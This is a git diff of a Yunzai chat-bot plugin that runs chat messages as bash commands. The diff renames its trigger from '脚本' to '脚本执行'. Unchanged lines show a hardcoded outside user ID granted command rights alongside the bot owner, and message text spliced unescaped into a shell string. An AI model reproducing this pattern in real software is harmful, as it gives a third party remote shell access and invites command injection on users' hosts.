@@ -13,13 +13,13 @@ let errorTips = "请使用脚本安装，再使用此功能\nhttps://Yunzai.TRSS
 export class Script extends plugin {
   constructor() {
     super({
-      name: "脚本",
-      dsc: "脚本",
+      name: "脚本执行",
+      dsc: "脚本执行",
       event: "message",
       priority: 10,
       rule: [
         {
-          reg: "^脚本.+",
+          reg: "^脚本执行.+",
           fnc: "Script"
         }
       ]
@@ -35,9 +35,9 @@ export class Script extends plugin {
   }
 
   async execTask(e, cmd) {
-    logger.mark(`[脚本] 执行：${logger.blue(cmd)}`)
+    logger.mark(`[脚本执行] 执行：${logger.blue(cmd)}`)
     let ret = await this.execSync(cmd)
-    logger.mark(`[脚本]\n${ret.stdout.trim()}\n${logger.red(ret.stderr.trim())}`)
+    logger.mark(`[脚本执行]\n${ret.stdout.trim()}\n${logger.red(ret.stderr.trim())}`)
 
     if (ret.stdout) {
       let Code = await ansi_up.ansi_to_html(ret.stdout.trim())
@@ -52,15 +52,15 @@ export class Script extends plugin {
     }
 
     if (ret.error) {
-      logger.error(`脚本错误：${logger.red(ret.error)}`)
-      await this.reply(`脚本错误：${ret.error}`, true)
+      logger.error(`脚本执行错误：${logger.red(ret.error)}`)
+      await this.reply(`脚本执行错误：${ret.error}`, true)
       await this.reply(errorTips)
     }
   }
 
   async Script(e) {
     if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
-    let msg = this.e.msg.replace("脚本", "").trim()
+    let msg = this.e.msg.replace("脚本执行", "").trim()
     let cmd = `bash "${cmdPath}" cmd "${msg}"`
     await this.execTask(e, cmd)
   }
